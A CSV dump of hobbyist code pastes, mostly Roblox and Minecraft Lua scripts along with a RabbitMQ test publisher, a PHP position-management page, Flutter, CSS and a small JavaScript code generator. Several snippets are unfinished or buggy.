id,title,username,language,date,content
Bzh31QZr,GULIKHUB,Trollwor,Lua,Wednesday 14th of May 2025 02:17:18 AM CDT,"-- GulikHub Full GUI - Upgraded Template with Classic Features
-- Rebuilt by your overconfident AI rebel genius

local Players = game:GetService(""Players"")
local RunService = game:GetService(""RunService"")
local UserInputService = game:GetService(""UserInputService"")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild(""PlayerGui"")

-- ScreenGui setup
local screenGui = Instance.new(""ScreenGui"")
screenGui.Name = ""GulikHubUI""
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.Parent = PlayerGui

-- Main draggable frame
local mainFrame = Instance.new(""Frame"")
mainFrame.Name = ""MainFrame""
mainFrame.Size = UDim2.new(0.6, 0, 0.6, 0)
mainFrame.Position = UDim2.new(0.2, 0, 0.2, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui

-- Title label
local titleLabel = Instance.new(""TextLabel"")
titleLabel.Size = UDim2.new(1, 0, 0.1, 0)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.Text = ""GulikHub UI""
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.BackgroundColor3 = Color3.fromRGB(80, 0, 150)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 22
titleLabel.Parent = mainFrame

-- Status Label (for prints/warns)
local statusLabel = Instance.new(""TextLabel"")
statusLabel.Size = UDim2.new(1, 0, 0.05, 0)
statusLabel.Position = UDim2.new(0, 0, 0.9, 0)
statusLabel.Text = ""Status: Ready""
statusLabel.TextColor3 = Color3.fromRGB(200, 200, 0)
statusLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
statusLabel.Font = Enum.Font.Code
statusLabel.TextSize = 16
statusLabel.Parent = mainFrame

-- FPS label
local fpsLabel = Instance.new(""TextLabel"")
fpsLabel.Size = UDim2.new(0.3, 0, 0.05, 0)
fpsLabel.Position = UDim2.new(0.7, 0, 0.95, 0)
fpsLabel.Text = ""FPS: 0""
fpsLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
fpsLabel.BackgroundTransparency = 1
fpsLabel.Font = Enum.Font.Code
fpsLabel.TextSize = 16
fpsLabel.Parent = mainFrame

-- RightShift toggle
local guiVisible = true
UserInputService.InputBegan:Connect(function(input, processed)
    if not processed and input.KeyCode == Enum.KeyCode.RightShift then
        guiVisible = not guiVisible
        screenGui.Enabled = guiVisible
        statusLabel.Text = ""Status: UI "" .. (guiVisible and ""Shown"" or ""Hidden"")
    end
end)

-- FPS counter logic
local lastTime = tick()
local frames = 0
RunService.RenderStepped:Connect(function()
    frames += 1
    if tick() - lastTime >= 1 then
        fpsLabel.Text = ""FPS: "" .. frames
        frames = 0
        lastTime = tick()
    end
end)

-- Language switcher basic (EN, RU, UA)
local currentLang = ""EN""
local function switchLanguage(lang)
    currentLang = lang
    if lang == ""EN"" then
        titleLabel.Text = ""GulikHub UI""
        statusLabel.Text = ""Status: Ready""
    elseif lang == ""RU"" then
        titleLabel.Text = ""ГуликХаб Интерфейс""
        statusLabel.Text = ""Статус: Готово""
    elseif lang == ""UA"" then
        titleLabel.Text = ""ГулікХаб Інтерфейс""
        statusLabel.Text = ""Статус: Готово""
    end
end

-- Language buttons
local languages = {""EN"", ""RU"", ""UA""}
for i, lang in ipairs(languages) do
    local button = Instance.new(""TextButton"")
    button.Size = UDim2.new(0.3, 0, 0.07, 0)
    button.Position = UDim2.new(0.05 + (i - 1) * 0.32, 0, 0.12, 0)
    button.Text = lang
    button.BackgroundColor3 = Color3.fromRGB(50, 50, 100)
    button.TextColor3 = Color3.new(1, 1, 1)
    button.Font = Enum.Font.Gotham
    button.TextSize = 16
    button.Parent = mainFrame
    button.MouseButton1Click:Connect(function()
        switchLanguage(lang)
    end)
end

-- Password checker (""opensesame"")
local passwordBox = Instance.new(""TextBox"")
passwordBox.Size = UDim2.new(0.6, 0, 0.08, 0)
passwordBox.Position = UDim2.new(0.2, 0, 0.21, 0)
passwordBox.PlaceholderText = ""Enter Password""
passwordBox.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
passwordBox.TextColor3 = Color3.new(1, 1, 1)
passwordBox.Font = Enum.Font.Code
passwordBox.TextSize = 18
passwordBox.Parent = mainFrame

passwordBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        if passwordBox.Text == ""opensesame"" then
            statusLabel.Text = ""Access Granted""
        else
            statusLabel.Text = ""Access Denied""
        end
    end
end)

-- Add more features like: Script Hub, Executor, Themes, Dock System
-- Modular, mobile-friendly, and rebellious. Expand it and rule!
"
PPHucRx4,stress test rmq,vitareinforce,Python,Wednesday 14th of May 2025 01:49:21 AM CDT,"import pika
import sys
import time
import keyboard  # Import the keyboard library

def connect_and_publish(client_id, user, password, host, queue_name):
    """"""Connect to RabbitMQ and publish messages with client ID set in connection properties.""""""
    credentials = pika.PlainCredentials(user, password)
    parameters = pika.ConnectionParameters(
        host=host,
        credentials=credentials,
        client_properties={
            'connection_name': client_id
        }
    )

    connection = None
    for i in range(5):
        try:
            connection = pika.BlockingConnection(parameters)
            print(f""Connected to RabbitMQ with client ID '{client_id}'"")
            break
        except pika.exceptions.AMQPConnectionError:
            print(f""Connection failed, retrying in 5 seconds... ({i+1}/5)"")
            time.sleep(5)
    else:
        print(""Failed to connect to RabbitMQ after 5 attempts."")
        sys.exit(1)

    channel = connection.channel()

    # Declare queue to publish to
    channel.queue_declare(queue=queue_name, durable=False)

    print(""Press 'Esc' to stop publishing messages."")

    # Loop to publish messages until 'Esc' is pressed
    while True:
        if keyboard.is_pressed('esc'):  # Check if 'Esc' key is pressed
            print(""Escape key pressed. Stopping the publisher."")
            break

        # Create a message
        message = f""Hello RabbitMQ! This is a test message from client_id {client_id}.""
        
        # Publish message
        channel.basic_publish(
            exchange='amq.topic',
            routing_key=queue_name,
            body=message,
            properties=pika.BasicProperties(
                delivery_mode=2,  # Persistent message
            )
        )

        print(f""Published message to queue '{queue_name}': {message}"")
        time.sleep(1)  # Sleep for a second before publishing the next message

    # Close connection
    connection.close()
    print(""Connection closed."")

if __name__ == ""__main__"":
    # Configuration
    CLIENT_ID = ""punclut516""
    USERNAME = ""camera""
    PASSWORD = ""camera""
    HOST = ""localhost""
    QUEUE_NAME = ""camera""

    connect_and_publish(CLIENT_ID, USERNAME, PASSWORD, HOST, QUEUE_NAME)
"
j9pGgBya,RBLX. GunDamage,Hasli4,Lua,Wednesday 14th of May 2025 01:37:37 AM CDT,"local bullet = script.Parent

local function player_check(otherPart)
local humanoid = otherPart.Parent:FindFirstChild('Humanoid')
if humanoid then
humanoid:TakeDamage(10)
local player = game.Players:FindFirstChild(humanoid.Parent.Name)
if player and humanoid.parent.name ~= bullet.Attacker.Value then
local tag = player:FindFirstChild('Killer')
if tag then
tag.Value = bullet.Attacker.Value
end
end
bullet:Destroy()
end
end

bullet.Touched:Connect(player_check)
"
RNup8yPf,rich text richtext flutter,muhaiminurabir,Dart,Wednesday 14th of May 2025 01:26:30 AM CDT,"              RichText(
                text: TextSpan(
                  style: GoogleFonts.poppins(
                    fontSize: 14,
                    fontWeight: FontWeight.w400,
                    color: ProjectColors.black4,
                  ),
                  children: [
                    TextSpan(text: ""We have sent an ""),
                    TextSpan(
                      text: ""OTP "",
                      style: GoogleFonts.poppins(
                        fontSize: 14,
                        fontWeight: FontWeight.w700,
                        color: ProjectColors.black4,
                      ),
                        recognizer: TapGestureRecognizer()..onTap = () =>Log().showMessageToast(message: ""paisi""),

                    ),
                    TextSpan(text: ""to the following email address""),
                  ],
                ),
              ),
"
0SZpHguY,RBLX. KingOfTheHill,Hasli4,Lua,Wednesday 14th of May 2025 12:42:33 AM CDT,"local Players = game:GetService(""Players"")

local Hill = script.Parent
local Label = Hill.BillboardGui.TextLabel
local king_name = Hill.KingName
local fall_distance = Hill.Size.Magnitude
print(""fall_distance:"", fall_distance)
local kingdown = true
local position1 = Hill.Position

local function onTouch(part)
    if (kingdown) then
        kingdown = false
        king_name.Value = part.Parent.Name
        Label.Text = ""Да здравствует король ""..king_name.Value..""!""
        local KING = part.Parent.Humanoid
        local player = Players:GetPlayerFromCharacter(part.Parent)
        local leaderstats = player.leaderstats
        local crowns = leaderstats and 
                       leaderstats:FindFirstChild(""Crowns"")
   local tool_to_destroy = player.Backpack:FindFirstChild(""Tool"")
   if tool_to_destroy then
      tool_to_destroy:Destroy()
   end
   tool_to_destroy = KING.Parent:FindFirstChild(""Tool"")
   if tool_to_destroy then
      tool_to_destroy:Destroy()
   end

   while true do
      wait(1)
      KING.BodyDepthScale.Value += 0.06
      KING.HeadScale.Value += 0.04
      KING.BodyWidthScale.Value += 0.04
      KING.BodyHeightScale.Value += 0.01
      KING.WalkSpeed *=0.99
      crowns.Value += 1
      local position2 = part.Position	
      local distance = (position1 - position2).magnitude
local position2 = part.Position	
local distance = (position1 - position2).magnitude
if distance > fall_distance then
	king_name.Value = """"
	Label.Text = ""Король пал!""
	KING.BodyDepthScale.Value = 1
	KING.HeadScale.Value = 1
	KING.BodyWidthScale.Value = 1
	KING.BodyHeightScale.Value = 1
	KING.WalkSpeed = 16
	kingdown = true
	local return_tool = game.ReplicatedStorage.Tool:Clone()
	return_tool.Parent = KING.Parent
	break
end

"
6F0dtZMw,Minecraft Turtle Dig,xPucTu4,Lua,Tuesday 13th of May 2025 11:38:25 PM CDT,"local tunnelLength = 50 -- <<< EDIT THIS for tunnel length!

function fuelLevel()
 if turtle.getFuelLevel() < 1000 then
  turtle.select(1)
  turtle.refuel(8)
  print(""Refueled"")
 end
end

function mine()
 while turtle.detect() do
  turtle.dig()
  sleep(0.5)
 end
 turtle.forward()

 for h = 1, height - 1 do
  if turtle.detectUp() then
   turtle.digUp()
   sleep(0.5)
  end
  turtle.up()
 end

 turtle.digDown()

 for h = 1, height - 1 do
  turtle.down()
 end
end

print(""Place fuel in slot 1!"")
print(""How wide will the tunnel be?"")
local x = tonumber(read())
print(""How high will the tunnel be?"")
height = tonumber(read())

while true do
 for i = 1, tunnelLength do
  fuelLevel()
  mine()
  turtle.turnLeft()
  for j = 1, math.floor(x / 2) do
   mine()
  end
  turtle.turnLeft()
  turtle.turnLeft()
  for j = 1, x - 1 do
   mine()
  end
  turtle.turnLeft()
  turtle.turnLeft()
  for j = 1, math.floor(x / 2) do
   turtle.forward()
  end
  turtle.turnRight()
 end

 -- Return to start
 turtle.turnLeft()
 turtle.turnLeft()
 for i = 1, tunnelLength do
  turtle.forward()
 end
 turtle.turnLeft()
 turtle.turnLeft()
end
"
yJQNg6X9,MY SOURCE CODE,Dev-Mood,PHP,Tuesday 13th of May 2025 11:14:06 PM CDT,"<?php
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

# Prevent access if user is not logged in
if (!isset($_SESSION['user_id'])) {
    header(""Location: index.php"");
    exit();
}

$user_id = $_SESSION['user_id'];
$role = $_SESSION['role'];

require_once ""../config/database.php"";

# Check if position name already exists
function positionExists($db, $positions) {
    try {
        $stmt = $db->prepare(""SELECT id FROM positions_tbl WHERE positions = :positions"");
        $stmt->bindParam(':positions', $positions, PDO::PARAM_STR);
        $stmt->execute();
        return $stmt->rowCount() > 0;
    } catch (PDOException $e) {
        error_log(""Error: "" . $e->getMessage());
        return false;
    }
}

# ===> Creating a new position
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['positions'])) {
    $positions = filter_var(trim($_POST['positions']), FILTER_SANITIZE_STRING);

    if (empty($positions)) {
        $_SESSION['error'] = ""Position name cannot be empty."";
    } else if (positionExists($db, $positions)) {
        $_SESSION['error'] = ""Position name already exists!"";
    } else {
        try {
            $status = 'enabled';
            $stmt = $db->prepare(""INSERT INTO positions_tbl (positions, status) VALUES (:positions, :status)"");
            $stmt->bindParam(':positions', $positions, PDO::PARAM_STR);
            $stmt->bindParam(':status', $status, PDO::PARAM_STR);
            $stmt->execute();
            $_SESSION['success'] = ""Position created successfully"";
        } catch (PDOException $e) {
            error_log(""Error: "" . $e->getMessage());
            $_SESSION['error'] = ""Error creating position, please try again."";
        }
    }
}

# ===> Toggling the status of a position
if (isset($_POST['toggle_status'])) {
    $position_id = $_POST['position_id'];

    try {
        $stmt = $db->prepare(""SELECT status FROM positions_tbl WHERE id = :position_id"");
        $stmt->bindParam(':position_id', $position_id, PDO::PARAM_INT);
        $stmt->execute();
        $position = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($position) {
            $currentStatus = $position['status'];
            $newStatus = $currentStatus == 'enabled' ? 'disabled' : 'enabled';
            $stmtUpdate = $db->prepare(""UPDATE positions_tbl SET status = :newStatus WHERE id = :position_id"");
            $stmtUpdate->bindParam(':newStatus', $newStatus, PDO::PARAM_STR);
            $stmtUpdate->bindParam(':position_id', $position_id, PDO::PARAM_INT);
            $stmtUpdate->execute();
            $_SESSION['success'] = ""Position status updated successfully"";
        } else {
            $_SESSION['error'] = ""Position not found"";
        }
    } catch (PDOException $e) {
        $_SESSION['error'] = ""Error updating position status: "" . $e->getMessage();
    }
}

# ===> Delete position
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['position_id']) && isset($_POST['delete_position_by_id'])) {
    $position_id = $_POST['position_id'];

    try {
        $stmt = $db->prepare(""DELETE FROM positions_tbl WHERE id = :position_id"");
        $stmt->bindParam(':position_id', $position_id, PDO::PARAM_INT);
        $stmt->execute();
        $_SESSION['success'] = ""Position deleted successfully"";
    } catch (PDOException $e) {
        $_SESSION['error'] = ""Error deleting position: "" . $e->getMessage();
    }
}

try {
    $stmt = $db->prepare(""SELECT * FROM positions_tbl"");
    $stmt->execute();
    $positions = $stmt->fetchAll(PDO::FETCH_ASSOC);
} catch (PDOException $e) {
    $_SESSION['error'] = ""Error fetching positions: "" . $e->getMessage();
}
?>

<!DOCTYPE html>
<html lang=""en"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Create Positions</title>
    <link rel=""stylesheet"" href=""../assets/css/bootstrap.min.css"">
    <link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css"">
</head>
<body>

<!-- Toast Notification -->
<?php if (isset($_SESSION['success']) || isset($_SESSION['error'])): ?>
<div aria-live=""polite"" aria-atomic=""true"" class=""position-fixed top-0 end-0 p-3"" style=""z-index: 1050;"">
    <div id=""toastNotif"" class=""toast align-items-center text-white <?php echo isset($_SESSION['success']) ? 'bg-success' : 'bg-danger'; ?> border-0 show"" role=""alert"">
        <div class=""d-flex"">
            <div class=""toast-body"">
                <?php 
                echo isset($_SESSION['success']) ? $_SESSION['success'] : $_SESSION['error']; 
                unset($_SESSION['success'], $_SESSION['error']);
                ?>
            </div>
            <button type=""button"" class=""btn-close btn-close-white me-2 m-auto"" data-bs-dismiss=""toast""></button>
        </div>
    </div>
</div>
<?php endif; ?>

<!-- Create Positions Modal -->
<div class=""modal fade"" id=""createPositionsModal"" tabindex=""-1"" aria-labelledby=""createPositionsModalLabel"" aria-hidden=""true"">
    <div class=""modal-dialog modal-dialog-centered"">
        <div class=""modal-content"">
            <div class=""modal-header bg-dark text-white"">
                <h5 class=""modal-title fw-bolder"" id=""createPositionsModalLabel"">Create Positions</h5>
                <button type=""button"" class=""btn-close"" data-bs-dismiss=""modal"" aria-label=""Close"" style=""background-color: #fff; display: flex; align-items: center; justify-content: center; text-align: center;"">❌</button>
            </div>
            <div class=""modal-body"">
                <form action="""" method=""POST"">
                    <div class=""mb-3"">
                        <label class=""form-label"">Position Name</label>
                        <input type=""text"" name=""positions"" class=""form-control form-control-sm"" required />
                    </div>
                    <div class=""mb-3 text-center"">
                        <button type=""submit"" class=""btn btn-dark btn-sm w-100"">Create</button>
                    </div>
                </form>
            </div>
        </div>
    </div>
</div>

<div class=""container mt-2"">
    <div class=""card shadow border-0"">
        <div class=""card-body"">

            <div class=""d-flex justify-content-end align-items-end mt-1 mb-1"">
                <button class=""btn btn-dark"" data-bs-toggle=""modal"" data-bs-target=""#createPositionsModal""><i class=""fas fa-plus""></i> New</button>
            </div>
            <!-- Search Box -->
            <div class=""mb-3"">
                <input type=""text"" id=""searchBox"" class=""form-control w-25"" placeholder=""Search positions..."">
            </div>
            <div class=""table-responsive"">
                <table class=""table"">
                    <thead>
                        <tr>
                            <th style=""display: none;"">ID</th>
                            <th>Positions</th>
                            <th>Status</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody id=""positionsTable"">
                        <?php foreach ($positions as $position): ?>
                            <tr>
                                <td style=""display: none;""><?php echo htmlspecialchars($position['id']); ?></td>
                                <td><?php echo htmlspecialchars($position['positions']); ?></td>
                                <td>
                                    <?php if ($position['status'] === 'enabled'): ?>
                                        <span class=""badge rounded-pill badge bg-primary"">Enabled</span>
                                    <?php else: ?>
                                        <span class=""badge rounded-pill badge bg-danger"">Disabled</span>
                                    <?php endif; ?>
                                </td>
                                <td>
                                    <div class=""d-flex align-items-center justify-content-center gap-2"">
                                        <form method=""POST"" action="""">
                                            <input type=""hidden"" name=""position_id"" value=""<?php echo htmlspecialchars($position['id']); ?>"">
                                            <?php if ($position['status'] === 'enabled'): ?>
                                                <button type=""submit"" name=""toggle_status"" class=""btn btn-danger btn-sm""><i class=""fa fa-ban"" aria-hidden=""true""></i> Disable</button>
                                            <?php else: ?>
                                                <button type=""submit"" name=""toggle_status"" class=""btn btn-primary btn-sm""><i class=""fa fa-check"" aria-hidden=""true""></i> Enable</button>
                                            <?php endif; ?>
                                        </form>
                                        <form method=""POST"">
                                            <input type=""hidden"" name=""position_id"" value=""<?php echo htmlspecialchars($position['id']); ?>"">
                                            <button type=""submit"" name=""delete_position_by_id"" class=""btn btn-danger btn-sm""><i class=""fa fa-trash""></i> Delete</button>
                                        </form>
                                    </div>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<!-- Search Script -->
<script>
document.getElementById(""searchBox"").addEventListener(""keyup"", function() {
    let input = this.value.toLowerCase();
    let rows = document.querySelectorAll(""#positionsTable tr"");

    rows.forEach(row => {
        let text = row.textContent.toLowerCase();
        row.style.display = text.includes(input) ? """" : ""none"";
    });
});
</script>
<script src=""../assets/js/bootstrap.bundle.min.js""></script>
<script src=""../assets/js/notif.js""></script>
</body>
</html>"
7UqEevp4,JKit || Change Font Color for Nav Menu and Button widget when Section is Sticky,fauzanjeg,CSS,Tuesday 13th of May 2025 10:48:23 PM CDT,"/* JKit || Change Font Color for Nav Menu and Button widget when Section is Sticky */
.elementor-element.elementor-element-cda33fc.sticky-pinned .jeg-elementor-kit.jkit-nav-menu .jkit-menu-wrapper .jkit-menu > li > a,
.elementor-element.elementor-element-cda33fc.sticky-pinned .jeg-elementor-kit.jkit-button .jkit-button-wrapper {
	color: black;
}
"
9UCaZBzg,Untitled,MatiGe,HTML,Tuesday 13th of May 2025 09:45:19 PM CDT,"<!DOCTYPE html>
<html>
<head>
    <title>Number Code Generator</title>
</head>
<body>
    <h1>Generate Your Lucky Code!</h1>
    <div id=""codeDisplay"">
        </div>
    <button id=""generateButton"">Generate New Code</button>

    <script type=""module"" src=""codegen.js"">
        
    </script>
</body>
</html>"
guDwCzwt,Untitled,MatiGe,JavaScript,Tuesday 13th of May 2025 09:44:53 PM CDT,"console.trace();
import { createRequire } from './module';
const require = createRequire(import.meta.url);
var express = require('express');
var cors = require('cors');
var app = express();
document.addEventListener('DOMContentLoaded', function () {
    const codeDisplay = document.getElementById('codeDisplay');
    const generateButton = document.getElementById('generateButton');
    const storageKey = 'generatedCode'; // Key for localStorage


    app.use(cors({ origin: true, credentials: true }));
    // Function to generate a 6-digit number code
    function generateCode() {
        let code = '';
        for (let i = 0; i < 6; i++) {
            code += Math.floor(Math.random() * 10); // Generates a random digit (0-9)
        }
        return code;
    }

    // Function to display the code
    function displayCode(code) {
        codeDisplay.textContent = 'Your Code: ' + code;
    }

    function saveCode(code) {
        fetch('save_code.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            mode: 'cors',
            body: 'code=' + encodeURIComponent(code),
        })
            .then(response => response.text())
            .then(data => {
                console.log('Server response:', data);
            })
            .catch(error => {
                console.error('Error saving code:', error);
            });
    }

    // Modified loadCode function to fetch data from the server
    function loadCode() {
        fetch('get_code.php')
            .then(response => response.json())
            .then(data => {
                if (data && data.code) {
                    displayCode(data.code);
                    console.log('Code loaded from server:', data.code);
                } else {
                    codeDisplay.textContent = 'No code generated yet.';
                }
            })
            .catch(error => {
                console.error('Error loading code:', error);
            });
    }
    // Event listener for the button click
    generateButton.addEventListener('click', function () {
        const newCode = generateCode();
        displayCode(newCode);
        saveCode(newCode); // In a real scenario, this would trigger an AJAX call to your server.
    });

    // Load any previously saved code when the page loads
    loadCode();
});"
tWsiFTDA,MainScript with 4 Votes (Script),Sungmingamerpro13,CSS,Tuesday 13th of May 2025 09:38:59 PM CDT,"local VoteRemotes = game.ReplicatedStorage.VoteRemotes
local VoteValues = game.ReplicatedStorage.VoteValues

function Voting_System(Time)
	for i = Time,0,-1 do
		VoteValues.Status.Value = i.."" Seconds Left To Choose!""
		wait(1)
	end
end

--- MainScript ---

VoteRemotes.ToggleVoteEvent:FireAllClients(true)
Voting_System(15)
VoteRemotes.ToggleVoteEvent:FireAllClients(false)

if VoteValues.Option1.Value > VoteValues.Option2.Value then
	print(""Option One Won!"")
elseif VoteValues.Option2.Value > VoteValues.Option1.Value then
	print(""Option Two Won!"")
elseif VoteValues.Option3.Value > VoteValues.Option2.Value then
	print(""Option Three Won!"")
elseif VoteValues.Option4.Value > VoteValues.Option3.Value then
	print(""Option Four Won!"")
end
"
bLgHNsNB,VoteServer ( Script + 4 Votes),Sungmingamerpro13,CSS,Tuesday 13th of May 2025 09:37:50 PM CDT,"-- Variables

local VoteRemotes = game.ReplicatedStorage.VoteRemotes
local VoteValues = game.ReplicatedStorage.VoteValues

-- Add Vote

VoteRemotes.AddVoteEvent.OnServerEvent:Connect(function(player, Option)
	print(""I won the vote Option""..Option)
	
	if Option == 1 then
		VoteValues.Option1.Value += 1
	elseif Option == 2 then
		VoteValues.Option2.Value += 1
	elseif Option == 3 then
		VoteValues.Option3.Value += 1
	elseif Option == 4 then
		VoteValues.Option4.Value += 1
	end
end)
"
xmMDEaBp,VotingSystem (LocalScript + 4 Votes),Sungmingamerpro13,CSS,Tuesday 13th of May 2025 09:36:30 PM CDT,"-- Variables

local VoteRemotes = game.ReplicatedStorage.VoteRemotes
local VoteValues = game.ReplicatedStorage.VoteValues

local hasVoted = false
local VoteFrame = script.Parent

local function Vote(Button, Option)
	if hasVoted == false then
		hasVoted = true
		
		Button.Image = ""rbxassetid://105874845643806""
		wait(2)
		Button.Image = ""rbxassetid://101641611766368""
		VoteRemotes.AddVoteEvent:FireServer(Option)
	end
end

-- Toggle Visible

VoteRemotes.ToggleVoteEvent.OnClientEvent:Connect(function(Value)
	
	if Value == true then
		VoteFrame.Visible = true
	elseif Value == false then
		VoteFrame.Visible = false
	end
end)

VoteFrame.Ending1.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending1.Button, 1)
end)

VoteFrame.Ending2.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending2.Button, 2)
end)

VoteFrame.Ending3.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending3.Button, 3)
end)

VoteFrame.Ending4.Button.MouseButton1Click:Connect(function()
	Vote(VoteFrame.Ending4.Button, 4)
end)

-- Update Count --

VoteValues.Option1.Changed:Connect(function()
	VoteFrame.Ending1.Votes.Text = VoteValues.Option1.Value
end)

VoteValues.Option2.Changed:Connect(function()
	VoteFrame.Ending2.Votes.Text = VoteValues.Option2.Value
end)

VoteValues.Option3.Changed:Connect(function()
	VoteFrame.Ending3.Votes.Text = VoteValues.Option3.Value
end)

VoteValues.Option4.Changed:Connect(function()
	VoteFrame.Ending4.Votes.Text = VoteValues.Option4.Value
end)

while wait() do
	VoteFrame.Status.Text = VoteValues.Status.Value
end
"
